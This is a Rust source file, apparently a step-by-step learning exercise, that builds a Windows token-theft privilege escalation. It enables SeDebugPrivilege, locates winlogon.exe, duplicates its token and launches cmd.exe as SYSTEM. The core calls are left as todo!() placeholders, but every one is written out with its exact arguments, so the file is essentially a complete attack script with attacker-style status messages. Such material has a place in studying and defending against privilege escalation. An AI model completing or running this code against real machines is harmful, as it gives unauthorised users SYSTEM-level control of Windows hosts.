use std::mem;
use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE, LUID};
use windows::Win32::Security::{
    AdjustTokenPrivileges, DuplicateTokenEx, LookupPrivilegeValueA,
    OpenProcessToken, SecurityImpersonation, TokenPrimary,
    LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED,
    TOKEN_ACCESS_MASK, TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS,
    TOKEN_DUPLICATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next,
    PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Threading::{
    CreateProcessWithTokenW, GetCurrentProcess, OpenProcess,
    PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
    STARTUPINFOW,
};
use windows::core::{PCWSTR, PWSTR};

fn main() {
    unsafe {
        // Phase 1 — Enable SeDebugPrivilege on our own token.
        // Without this, OpenProcess on winlogon.exe will fail with ACCESS_DENIED.
        let htoken = enable_sedebug();

        // Phase 2 — Find winlogon.exe by scanning the process list.
        let winlogon_pid = find_pid(b"winlogon.exe\0");
        println!("[*] winlogon.exe PID: {}", winlogon_pid);

        // Phase 3 — Steal its token and spawn cmd.exe as SYSTEM.
        steal_token_and_spawn(winlogon_pid);

        CloseHandle(htoken).ok();
    }
}

unsafe fn enable_sedebug() -> HANDLE {
    // Step 1 — Open a handle to our own process token with enough rights
    // to adjust its privilege set.
    //
    // OpenProcessToken(
    //     processhandle: HANDLE,        // GetCurrentProcess() — pseudo-handle, always valid
    //     desiredaccess: TOKEN_ACCESS_MASK, // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    //     tokenhandle: *mut HANDLE,     // out: handle to our token
    // ) -> Result<()>
    let mut htoken = HANDLE::default();
    todo!("OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htoken)");

    // Step 2 — Resolve the LUID for "SeDebugPrivilege".
    // Privilege names are strings; the OS maps them to LUIDs (locally unique IDs)
    // that are specific to this boot. LookupPrivilegeValueA does the mapping.
    //
    // LookupPrivilegeValueA(
    //     lpsystemname: PCSTR,  // None / null — local system
    //     lpname: PCSTR,        // "SeDebugPrivilege\0" — the privilege name
    //     lpluid: *mut LUID,    // out: the LUID for this privilege on this boot
    // ) -> Result<()>
    let mut luid = LUID::default();
    todo!("LookupPrivilegeValueA(PCSTR::null(), b\"SeDebugPrivilege\\0\", &mut luid)");

    // Step 3 — Build a TOKEN_PRIVILEGES struct and call AdjustTokenPrivileges.
    // TOKEN_PRIVILEGES holds an array of privilege+attribute pairs.
    // SE_PRIVILEGE_ENABLED in Attributes means "turn this on".
    //
    // AdjustTokenPrivileges(
    //     tokenhandle: HANDLE,               // htoken from step 1
    //     disableallprivileges: BOOL,        // FALSE — we are not disabling all, just adjusting
    //     newstate: *const TOKEN_PRIVILEGES, // pointer to our TOKEN_PRIVILEGES struct
    //     bufferlength: u32,                 // 0 — we don't need the previous state returned
    //     previousstate: *mut TOKEN_PRIVILEGES, // null — not interested in previous state
    //     returnlength: *mut u32,            // null
    // ) -> Result<()>
    //
    // Note: AdjustTokenPrivileges returns Ok(()) even if the privilege wasn't present.
    // Call GetLastError() after to confirm ERROR_SUCCESS (0) rather than ERROR_NOT_ALL_ASSIGNED.
    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };
    todo!("AdjustTokenPrivileges(htoken, FALSE, &tp, 0, None, None)");
    // Check GetLastError() == 0 here to confirm the privilege was actually granted

    println!("[+] SeDebugPrivilege enabled");
    htoken
}

unsafe fn find_pid(target_name: &[u8]) -> u32 {
    // Step 4 — Enumerate all running processes with a snapshot.
    // CreateToolhelp32Snapshot takes a point-in-time picture of the process list.
    //
    // CreateToolhelp32Snapshot(
    //     dwflags: CREATE_TOOLHELP_SNAPSHOT_FLAGS, // TH32CS_SNAPPROCESS — include all processes
    //     th32processid: u32,                      // 0 — snapshot of all processes
    // ) -> Result<HANDLE>                          // handle to the snapshot
    let hsnap: HANDLE = todo!("CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)");

    // Step 5 — Iterate the snapshot to find winlogon.exe.
    // Process32First gets the first entry; Process32Next advances the cursor.
    // PROCESSENTRY32.szExeFile holds the process image name (not full path).
    // PROCESSENTRY32.th32ProcessID holds the PID.
    //
    // IMPORTANT: set pe.dwSize = mem::size_of::<PROCESSENTRY32>() as u32 before calling
    // Process32First — Windows checks this field and will fail otherwise.
    //
    // Process32First(
    //     hsnapshot: HANDLE,       // snapshot handle
    //     lppe: *mut PROCESSENTRY32, // out: first process entry
    // ) -> Result<()>
    //
    // Process32Next(
    //     hsnapshot: HANDLE,
    //     lppe: *mut PROCESSENTRY32,
    // ) -> Result<()>              // Err when there are no more entries
    let mut pe = PROCESSENTRY32 {
        dwSize: mem::size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };
    let mut pid = 0u32;
    todo!("Process32First(hsnap, &mut pe) — then loop with Process32Next, compare pe.szExeFile bytes to target_name, store pe.th32ProcessID in pid when found");

    CloseHandle(hsnap).ok();
    assert!(pid != 0, "winlogon.exe not found — are you running on Windows?");
    pid
}

unsafe fn steal_token_and_spawn(target_pid: u32) {
    // Step 6 — Open the target process with enough rights to query its token.
    //
    // OpenProcess(
    //     dwdesiredaccess: PROCESS_ACCESS_RIGHTS, // PROCESS_QUERY_INFORMATION — enough to get the token
    //     binherithandle: BOOL,                   // FALSE
    //     dwprocessid: u32,                       // target PID (winlogon.exe)
    // ) -> Result<HANDLE>                         // handle to the target process
    let hproc: HANDLE = todo!("OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid)");

    // Step 7 — Open the target's token with TOKEN_DUPLICATE rights.
    // We need TOKEN_DUPLICATE so we can clone the token in the next step.
    //
    // OpenProcessToken(
    //     processhandle: HANDLE,            // hproc from step 6
    //     desiredaccess: TOKEN_ACCESS_MASK, // TOKEN_DUPLICATE
    //     tokenhandle: *mut HANDLE,         // out: handle to the target's token
    // ) -> Result<()>
    let mut htoken_src = HANDLE::default();
    todo!("OpenProcessToken(hproc, TOKEN_DUPLICATE, &mut htoken_src)");

    // Step 8 — Duplicate the token as a primary token.
    // An impersonation token can only be used by a thread temporarily.
    // A primary token can be used to create a new process that runs as that identity.
    //
    // DuplicateTokenEx(
    //     hexistingtoken: HANDLE,                    // htoken_src
    //     dwdesiredaccess: TOKEN_ACCESS_MASK,        // TOKEN_ALL_ACCESS
    //     lptokenattributes: Option<*const SECURITY_ATTRIBUTES>, // None
    //     impersonationlevel: SECURITY_IMPERSONATION_LEVEL, // SecurityImpersonation
    //     tokentype: TOKEN_TYPE,                     // TokenPrimary — for CreateProcessWithTokenW
    //     phnewtoken: *mut HANDLE,                   // out: the duplicated primary token
    // ) -> Result<()>
    let mut htoken_duped = HANDLE::default();
    todo!("DuplicateTokenEx(htoken_src, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, &mut htoken_duped)");

    // Step 9 — Spawn cmd.exe using the duplicated SYSTEM token.
    // CreateProcessWithTokenW uses a primary token to start a process as a different user.
    // The spawned cmd.exe will run as SYSTEM.
    //
    // CreateProcessWithTokenW(
    //     htoken: HANDLE,                         // htoken_duped — the primary SYSTEM token
    //     dwlogonflags: CREATE_PROCESS_WITH_TOKEN_FLAGS, // 0 — no special logon flags
    //     lpapplicationname: PCWSTR,              // None — use lpcommandline
    //     lpcommandline: PWSTR,                   // mutable wide-string buffer for "cmd.exe\0"
    //     dwcreationflags: PROCESS_CREATION_FLAGS, // 0
    //     lpenvironment: Option<*const c_void>,   // None
    //     lpcurrentdirectory: PCWSTR,             // None
    //     lpstartupinfo: *const STARTUPINFOW,     // &si — use STARTUPINFOW (wide version)
    //     lpprocessinformation: *mut PROCESS_INFORMATION, // &mut pi
    // ) -> Result<()>
    let mut cmd: Vec<u16> = "cmd.exe\0".encode_utf16().collect();
    let mut si = STARTUPINFOW {
        cb: mem::size_of::<STARTUPINFOW>() as u32,
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();
    todo!("CreateProcessWithTokenW(htoken_duped, 0, PCWSTR::null(), PWSTR(cmd.as_mut_ptr()), 0, None, PCWSTR::null(), &si, &mut pi)");

    println!("[+] cmd.exe spawned as SYSTEM — run 'whoami' to confirm");

    // Clean up handles
    CloseHandle(pi.hProcess).ok();
    CloseHandle(pi.hThread).ok();
    CloseHandle(htoken_duped).ok();
    CloseHandle(htoken_src).ok();
    CloseHandle(hproc).ok();
}
